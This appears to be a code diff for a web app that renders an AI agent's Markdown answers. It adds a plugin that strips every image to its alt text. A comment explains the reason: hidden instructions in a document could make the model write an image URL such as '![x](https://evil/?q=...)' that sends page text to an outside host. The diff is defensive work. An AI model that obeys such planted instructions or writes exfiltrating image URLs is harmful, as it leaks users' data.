@@ -54,6 +54,33 @@ function joinMarkers(node: Nodes) {
   parent.children.forEach(joinMarkers);
 }
 
+// A browser fetches an image by itself, with no click, so an image URL written
+// by the model could send text out of the page ("![x](https://evil/?q=...)"). A
+// document with hidden instructions is enough to cause that. Answers never need
+// images, so each one is replaced by its alt text before any HTML exists. Both
+// Markdown forms are nodes here: "image" (inline URL) and "imageReference" (URL
+// defined elsewhere in the text).
+export function remarkNoImages() {
+  return (tree: Nodes) => replaceImages(tree);
+}
+
+function replaceImages(node: Nodes) {
+  if (!("children" in node)) return;
+  const parent = node as Parents;
+  parent.children = parent.children.map((child) =>
+    child.type === "image" || child.type === "imageReference"
+      ? { type: "text", value: child.alt ?? "" }
+      : child,
+  ) as Parents["children"];
+  parent.children.forEach(replaceImages);
+}
+
 // remark-gfm: tables, which the agent often uses for lists of rules or courses.
 // remarkInlineCitations runs last, so a "<br>" before a marker is joined too.
-export const ANSWER_REMARK_PLUGINS = [remarkGfm, remarkHtmlBreaks, remarkInlineCitations];
+// Every <Markdown> in the app uses this list (answerImages.test.tsx checks it).
+export const ANSWER_REMARK_PLUGINS = [
+  remarkGfm,
+  remarkNoImages,
+  remarkHtmlBreaks,
+  remarkInlineCitations,
+];
